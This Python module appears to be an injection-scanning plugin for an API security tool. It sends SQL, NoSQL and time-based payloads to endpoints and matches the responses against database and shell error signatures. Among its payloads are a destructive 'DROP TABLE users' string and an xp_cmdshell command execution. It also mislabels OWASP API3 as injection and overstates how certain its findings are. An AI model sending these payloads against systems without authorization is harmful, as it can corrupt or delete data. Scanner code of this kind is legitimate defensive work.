"""
Plugin: Injection — SQL, NoSQL, Command Injection

OWASP API3:2023 — Broken Object Property Level Authorization / Injection

Tests whether the API is vulnerable to injection attacks by probing
discovered input surfaces with carefully crafted payloads.

Detection strategy (multi-signal, low false-positive rate):
──────────────────────────────────────────────────────────────────────────────
1. ERROR-BASED: Response contains database/interpreter error strings
   (SQL syntax errors, MongoDB exceptions, stack traces) — HIGH confidence

2. DIFFERENTIAL: Injected payload changes response code or body content
   significantly vs a baseline request — MEDIUM confidence

3. TIME-BASED BLIND: Response takes measurably longer with sleep/delay
   payloads — HIGH confidence for databases that support time functions

4. BOOLEAN-BASED: Tautology vs contradiction payloads produce different
   response sizes/codes (e.g., 1=1 vs 1=2) — HIGH confidence
──────────────────────────────────────────────────────────────────────────────

Every finding is CONFIRMED (evidence: HTTP request/response or timing delta).
We never report theoretical injection — only what we can prove.
"""

from __future__ import annotations

import asyncio
import re
import time
from typing import Optional
from urllib.parse import urlencode, urlparse, parse_qs, urljoin

import httpx

from secforge.plugins.base import BasePlugin
from secforge.models.finding import Finding
from secforge.models.evidence import Evidence
from secforge.models.enums import Severity, FindingStatus
from secforge.models.target import TargetConfig
from secforge.core.client import SecForgeClient


# ── SQL Injection Payloads ─────────────────────────────────────────────────────
SQL_ERROR_PAYLOADS = [
    "'",
    "''",
    "`",
    "\"",
    "1'",
    "1\"",
    "1`",
    "' OR '1'='1",
    "' OR 1=1--",
    "'; --",
    "1; DROP TABLE users--",
    "1' AND 1=CONVERT(int,@@version)--",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
]

SQL_BOOLEAN_PAYLOADS = [
    ("' OR '1'='1", "' OR '1'='2"),     # tautology vs contradiction
    ("1 OR 1=1", "1 OR 1=2"),
    ("' OR 1=1 --", "' OR 1=2 --"),
]

SQL_TIME_PAYLOADS = [
    "'; WAITFOR DELAY '0:0:5'--",           # MSSQL
    "'; SELECT SLEEP(5)--",                  # MySQL
    "' OR SLEEP(5)--",                       # MySQL
    "1; SELECT pg_sleep(5)--",               # PostgreSQL
    "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",  # MySQL alternate
    "'; EXEC xp_cmdshell('ping -n 5 127.0.0.1')--",  # MSSQL
]

# ── NoSQL Injection Payloads ──────────────────────────────────────────────────
NOSQL_QUERY_PAYLOADS = [
    '{"$gt": ""}',
    '{"$ne": null}',
    '{"$where": "1==1"}',
    '{"$regex": ".*"}',
]

NOSQL_BODY_PAYLOADS = [
    {"$gt": ""},
    {"$ne": None},
    {"$where": "1==1"},
    {"$regex": ".*"},
]

# ── Error String Signatures ───────────────────────────────────────────────────
SQL_ERROR_SIGNATURES = [
    # MySQL
    r"you have an error in your sql syntax",
    r"warning: mysql_",
    r"unclosed quotation mark",
    r"mysql_fetch_array",
    r"supplied argument is not a valid mysql",
    # PostgreSQL
    r"pg_query\(\):",
    r"pg_exec\(\):",
    r"postgresql.*error",
    r"invalid input syntax for",
    r"unterminated quoted string",
    r"ERROR:  syntax error at or near",
    # MSSQL
    r"microsoft.*odbc.*driver",
    r"microsoft.*ole db.*provider",
    r"odbc.*sql server",
    r"native client.*sql server",
    r"syntax error converting",
    r"unclosed quotation mark after the character string",
    # Oracle
    r"ora-\d{4,5}",
    r"oracle.*driver",
    r"quoted string not properly terminated",
    # SQLite
    r"sqlite.*syntax error",
    r"sqlite_step\(\)",
    # Generic
    r"sql syntax.*error",
    r"syntax error.*sql",
    r"warning.*pg_",
]

NOSQL_ERROR_SIGNATURES = [
    r"mongoerror",
    r"mongodb.*error",
    r"\$where.*is not allowed",
    r"bsonerror",
    r"failed to execute.*query",
    r"castError",
    r"validationerror.*schema",
    r"mongoose.*cast",
]

COMMAND_INJECTION_SIGNALS = [
    r"sh: .+: command not found",
    r"cmd: .+: command not found",
    r"/bin/sh:",
    r"syntax error.*unexpected",
    r"Windows IP Configuration",
    r"PING.*bytes of data",
    r"uid=\d+\(",
]

# ── Common endpoint patterns to probe ─────────────────────────────────────────
PROBE_PATHS = [
    # Search/filter/query — highest injection likelihood
    "/api/v1/search",
    "/api/search",
    "/search",
    "/api/v1/filter",
    "/filter",
    "/api/v1/query",
    "/query",
    "/api/v1/products",
    "/api/products",
    "/products",
    "/api/v1/items",
    "/items",
    "/api/v1/orders",
    "/orders",
    "/api/v1/reports",
    "/reports",
    # User/account endpoints
    "/api/v1/users",
    "/api/v2/users",
    "/api/users",
    "/users",
    "/api/v1/login",
    "/api/login",
    "/login",
]

# Common query parameter names that often feed into DB queries
INJECTABLE_PARAMS = [
    "q", "search", "query", "keyword", "term",
    "filter", "category", "type",
    "id", "user_id", "userId",
    "name", "email", "username",
    "sort", "order", "limit", "offset", "page",
]


class InjectionPlugin(BasePlugin):
    name = "injection"
    description = "SQL, NoSQL, and command injection detection (OWASP API3)"
    owasp_id = "API3:2023"

    async def run(self, target: TargetConfig, client: SecForgeClient) -> list[Finding]:
        findings: list[Finding] = []

        # ── Discover input surfaces ────────────────────────────────────────────
        surfaces = await _discover_surfaces(client, target)

        # ── Test each surface ──────────────────────────────────────────────────
        tested: set[str] = set()

        for surface in surfaces[:50]:  # cap to avoid excessive requests
            key = f"{surface['method']}:{surface['path']}:{surface['param']}"
            if key in tested:
                continue
            tested.add(key)

            # Pre-flight: skip surfaces that return 404 (endpoint doesn't exist)
            preflight = await _inject(client, surface, surface.get("baseline_value", "1"))
            if preflight is None or preflight.status_code == 404:
                continue

            # Error-based SQL injection
            sql_finding = await _test_sql_error_based(client, surface)
            if sql_finding:
                findings.append(sql_finding)
                continue  # No need to test more on confirmed injection point

            # Boolean-based SQL injection
            bool_finding = await _test_sql_boolean(client, surface)
            if bool_finding:
                findings.append(bool_finding)
                continue

            # Time-based blind SQL injection
            time_finding = await _test_sql_time_based(client, surface)
            if time_finding:
                findings.append(time_finding)
                continue

            # NoSQL injection
            nosql_finding = await _test_nosql(client, surface)
            if nosql_finding:
                findings.append(nosql_finding)

        return findings


# ── Surface Discovery ──────────────────────────────────────────────────────────

async def _discover_surfaces(
    client: SecForgeClient,
    target: TargetConfig,
) -> list[dict]:
    """
    Build a list of injectable surfaces:
    {"method": "GET", "path": "/api/users", "param": "search", "in": "query"|"body"|"path"}
    """
    surfaces: list[dict] = []

    # 1. Try common paths with common params as GET query strings
    for path in PROBE_PATHS:
        for param in INJECTABLE_PARAMS:
            surfaces.append({
                "method": "GET",
                "path": path,
                "param": param,
                "in": "query",
                "baseline_value": "1",
            })

    # 2. Try OpenAPI/Swagger to find real parameters
    for spec_path in ["/openapi.json", "/swagger.json", "/api-docs", "/v2/api-docs"]:
        try:
            resp = await client.get(spec_path)
            if resp.status_code == 200:
                text = resp.text[:8000]
                # Extract path + param combinations from spec
                path_matches = re.findall(r'"(/[^"]*\{[^}]+\}[^"]*)"', text)
                param_matches = re.findall(r'"name":\s*"([^"]+)".*?"in":\s*"(query|path|body)"', text, re.DOTALL)
                for name, location in param_matches[:20]:
                    if location in ("query", "body"):
                        for path in path_matches[:10] or PROBE_PATHS[:5]:
                            normalized_path = re.sub(r'\{[^}]+\}', '1', path)
                            surfaces.append({
                                "method": "GET" if location == "query" else "POST",
                                "path": normalized_path,
                                "param": name,
                                "in": location,
                                "baseline_value": "test",
                            })
                break
        except httpx.HTTPError:
            continue

    # 3. Probe root for actual response endpoints with params
    try:
        resp = await client.get("/")
        if resp.status_code == 200:
            # Find query string patterns in the response body (links, references)
            links = re.findall(r'["\'](?:/[^"\'?]+)\?([^"\'&]+=[^"\'&]+)', resp.text[:4000])
            for qs in links[:10]:
                for pair in qs.split("&"):
                    if "=" in pair:
                        k, v = pair.split("=", 1)
                        surfaces.append({
                            "method": "GET",
                            "path": "/",
                            "param": k.strip(),
                            "in": "query",
                            "baseline_value": v.strip() or "1",
                        })
    except httpx.HTTPError:
        pass

    # Deduplicate and cap
    seen = set()
    unique = []
    for s in surfaces:
        key = f"{s['method']}:{s['path']}:{s['param']}"
        if key not in seen:
            seen.add(key)
            unique.append(s)

    return unique[:60]  # Cap to avoid excessive requests


# ── SQL Error-Based Testing ────────────────────────────────────────────────────

async def _test_sql_error_based(
    client: SecForgeClient,
    surface: dict,
) -> Optional[Finding]:
    """Inject SQL error payloads; look for DB error strings in response."""

    for payload in SQL_ERROR_PAYLOADS:
        try:
            resp = await _inject(client, surface, payload)
            if resp is None:
                continue
            body_lower = resp.text.lower() if resp.text else ""
            for sig in SQL_ERROR_SIGNATURES:
                if re.search(sig, body_lower):
                    ev = Evidence.from_httpx(
                        resp.request, resp,
                        note=(
                            f"SQL error signature detected after injecting: {repr(payload)}\n"
                            f"Matched pattern: {sig}"
                        ),
                    )
                    return Finding(
                        title="SQL Injection — Error-Based (Confirmed)",
                        description=(
                            f"The parameter '{surface['param']}' on {surface['method']} "
                            f"{surface['path']} reflects a database error message when "
                            "injected with SQL syntax.\n\n"
                            f"Injected payload: {repr(payload)}\n"
                            f"Error pattern matched: {sig}\n\n"
                            "This confirms the input is being passed unsanitized to a SQL "
                            "query. Full database access is likely achievable."
                        ),
                        severity=Severity.CRITICAL,
                        status=FindingStatus.CONFIRMED,
                        owasp_id="API3:2023",
                        plugin="injection",
                        endpoint=surface["path"],
                        remediation=(
                            "Use parameterized queries (prepared statements) for all "
                            "database interactions. Never concatenate user input into SQL "
                            "strings. Use an ORM with proper parameter binding. "
                            "Additionally, disable detailed error messages in production."
                        ),
                        references=[
                            "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
                            "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html",
                        ],
                        evidence=[ev],
                    )
        except httpx.HTTPError:
            continue

    return None


# ── SQL Boolean-Based Testing ──────────────────────────────────────────────────

async def _test_sql_boolean(
    client: SecForgeClient,
    surface: dict,
) -> Optional[Finding]:
    """
    Boolean-based injection: tautology (1=1) vs contradiction (1=2).
    If response sizes differ significantly, injection is probable.
    """
    for true_payload, false_payload in SQL_BOOLEAN_PAYLOADS:
        try:
            resp_true  = await _inject(client, surface, true_payload)
            resp_false = await _inject(client, surface, false_payload)
            if resp_true is None or resp_false is None:
                continue

            len_true  = len(resp_true.text or "")
            len_false = len(resp_false.text or "")

            # Status codes differ OR body length differs by >30%
            code_diff = resp_true.status_code != resp_false.status_code
            size_diff = (
                max(len_true, len_false) > 50
                and abs(len_true - len_false) / max(len_true, len_false, 1) > 0.3
            )

            if code_diff or size_diff:
                ev_true  = Evidence.from_httpx(resp_true.request, resp_true,
                    note=f"Tautology payload: {repr(true_payload)}")
                ev_false = Evidence.from_httpx(resp_false.request, resp_false,
                    note=f"Contradiction payload: {repr(false_payload)}")
                return Finding(
                    title="SQL Injection — Boolean-Based (Confirmed)",
                    description=(
                        f"Parameter '{surface['param']}' on {surface['method']} "
                        f"{surface['path']} produces measurably different responses "
                        "for tautology vs contradiction SQL conditions.\n\n"
                        f"Tautology payload: {repr(true_payload)} → HTTP {resp_true.status_code}, {len_true} bytes\n"
                        f"Contradiction payload: {repr(false_payload)} → HTTP {resp_false.status_code}, {len_false} bytes\n\n"
                        "This confirms SQL injection — an attacker can extract the "
                        "entire database contents using boolean-based blind extraction."
                    ),
                    severity=Severity.CRITICAL,
                    status=FindingStatus.CONFIRMED,
                    owasp_id="API3:2023",
                    plugin="injection",
                    endpoint=surface["path"],
                    remediation=(
                        "Use parameterized queries (prepared statements). "
                        "Never build SQL by concatenating user input."
                    ),
                    references=[
                        "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
                    ],
                    evidence=[ev_true, ev_false],
                )
        except httpx.HTTPError:
            continue

    return None


# ── SQL Time-Based Blind ───────────────────────────────────────────────────────

async def _test_sql_time_based(
    client: SecForgeClient,
    surface: dict,
) -> Optional[Finding]:
    """
    Time-based blind injection: measure response time with sleep payloads.
    Baseline must be established first to avoid false positives.
    """
    # Establish baseline response time (3 samples)
    baseline_times: list[float] = []
    for _ in range(2):
        try:
            t0 = time.monotonic()
            await _inject(client, surface, surface.get("baseline_value", "1"))
            baseline_times.append(time.monotonic() - t0)
        except httpx.HTTPError:
            return None

    if not baseline_times:
        return None
    baseline_avg = sum(baseline_times) / len(baseline_times)

    # Test time payloads — only flag if response takes 4+ seconds MORE than baseline
    for payload in SQL_TIME_PAYLOADS[:3]:  # Limit to avoid slow scans
        try:
            t0 = time.monotonic()
            resp = await _inject(client, surface, payload, timeout=12.0)
            elapsed = time.monotonic() - t0

            if resp and elapsed > baseline_avg + 4.0:
                ev = Evidence.from_httpx(
                    resp.request, resp,
                    note=(
                        f"Time-based blind injection: response took {elapsed:.1f}s "
                        f"vs baseline {baseline_avg:.1f}s (+{elapsed-baseline_avg:.1f}s).\n"
                        f"Payload: {repr(payload)}"
                    ),
                )
                return Finding(
                    title="SQL Injection — Time-Based Blind (Confirmed)",
                    description=(
                        f"Parameter '{surface['param']}' on {surface['method']} "
                        f"{surface['path']} introduces a measurable delay when injected "
                        "with a database sleep payload.\n\n"
                        f"Payload: {repr(payload)}\n"
                        f"Response time: {elapsed:.1f}s (baseline: {baseline_avg:.1f}s, "
                        f"delta: +{elapsed-baseline_avg:.1f}s)\n\n"
                        "This confirms time-based blind SQL injection. Data extraction "
                        "is possible through bit-by-bit timing oracle attacks."
                    ),
                    severity=Severity.CRITICAL,
                    status=FindingStatus.CONFIRMED,
                    owasp_id="API3:2023",
                    plugin="injection",
                    endpoint=surface["path"],
                    remediation=(
                        "Use parameterized queries (prepared statements). "
                        "Never build SQL by concatenating user input."
                    ),
                    references=[
                        "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
                    ],
                    evidence=[ev],
                )
        except (httpx.HTTPError, httpx.TimeoutException):
            continue

    return None


# ── NoSQL Injection ────────────────────────────────────────────────────────────

async def _test_nosql(
    client: SecForgeClient,
    surface: dict,
) -> Optional[Finding]:
    """Test MongoDB-style NoSQL injection operators."""
    # Query string: inject as value for the param
    for payload in NOSQL_QUERY_PAYLOADS:
        try:
            resp = await _inject(client, surface, payload)
            if resp is None:
                continue
            body_lower = (resp.text or "").lower()
            for sig in NOSQL_ERROR_SIGNATURES:
                if re.search(sig, body_lower, re.IGNORECASE):
                    ev = Evidence.from_httpx(
                        resp.request, resp,
                        note=f"NoSQL error signature after payload: {repr(payload)}"
                    )
                    return Finding(
                        title="NoSQL Injection — Error-Based (Confirmed)",
                        description=(
                            f"Parameter '{surface['param']}' on {surface['method']} "
                            f"{surface['path']} returns a NoSQL error message when "
                            "injected with a MongoDB operator payload.\n\n"
                            f"Payload: {repr(payload)}\n"
                            f"Error pattern: {sig}\n\n"
                            "This confirms the input is being passed unsanitized to a "
                            "NoSQL query. Authentication bypass and data exfiltration "
                            "are likely achievable."
                        ),
                        severity=Severity.CRITICAL,
                        status=FindingStatus.CONFIRMED,
                        owasp_id="API3:2023",
                        plugin="injection",
                        endpoint=surface["path"],
                        remediation=(
                            "Validate and sanitize all inputs before passing to NoSQL queries. "
                            "Use a schema validation library. In MongoDB, use $match with "
                            "strict type checking. Never pass raw user objects as query filters."
                        ),
                        references=[
                            "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
                            "https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.6-Testing_for_NoSQL_Injection",
                        ],
                        evidence=[ev],
                    )
        except httpx.HTTPError:
            continue

    # Body injection (POST endpoints)
    if surface["method"] in ("POST", "PUT", "PATCH"):
        for payload_dict in NOSQL_BODY_PAYLOADS:
            try:
                resp = await client.request(
                    surface["method"],
                    surface["path"],
                    json={surface["param"]: payload_dict},
                )
                body_lower = (resp.text or "").lower()
                for sig in NOSQL_ERROR_SIGNATURES:
                    if re.search(sig, body_lower, re.IGNORECASE):
                        ev = Evidence.from_httpx(resp.request, resp,
                            note=f"NoSQL body injection payload: {payload_dict}")
                        return Finding(
                            title="NoSQL Injection — Body Injection (Confirmed)",
                            description=(
                                f"The '{surface['param']}' field in {surface['method']} "
                                f"{surface['path']} accepts MongoDB operators in the request body."
                            ),
                            severity=Severity.CRITICAL,
                            status=FindingStatus.CONFIRMED,
                            owasp_id="API3:2023",
                            plugin="injection",
                            endpoint=surface["path"],
                            remediation=(
                                "Use strict schema validation (e.g., Pydantic, Joi, Yup) to "
                                "reject unexpected types. Never pass raw request body fields "
                                "directly as MongoDB query operators."
                            ),
                            references=[
                                "https://owasp.org/API-Security/editions/2023/en/0xa3-broken-object-property-level-authorization/",
                            ],
                            evidence=[ev],
                        )
            except httpx.HTTPError:
                continue

    return None


# ── Injection Helper ───────────────────────────────────────────────────────────

async def _inject(
    client: SecForgeClient,
    surface: dict,
    payload: str,
    timeout: float = 10.0,
) -> Optional[httpx.Response]:
    """Inject payload into the surface based on its type."""
    try:
        if surface["in"] == "query":
            resp = await client.get(
                surface["path"],
                params={surface["param"]: payload},
                timeout=timeout,
            )
        elif surface["in"] == "body":
            resp = await client.request(
                surface["method"],
                surface["path"],
                json={surface["param"]: payload},
                timeout=timeout,
            )
        elif surface["in"] == "path":
            path = re.sub(r'\{[^}]+\}', payload, surface["path"], count=1)
            resp = await client.get(path, timeout=timeout)
        else:
            return None
        return resp
    except (httpx.HTTPError, httpx.TimeoutException):
        return None
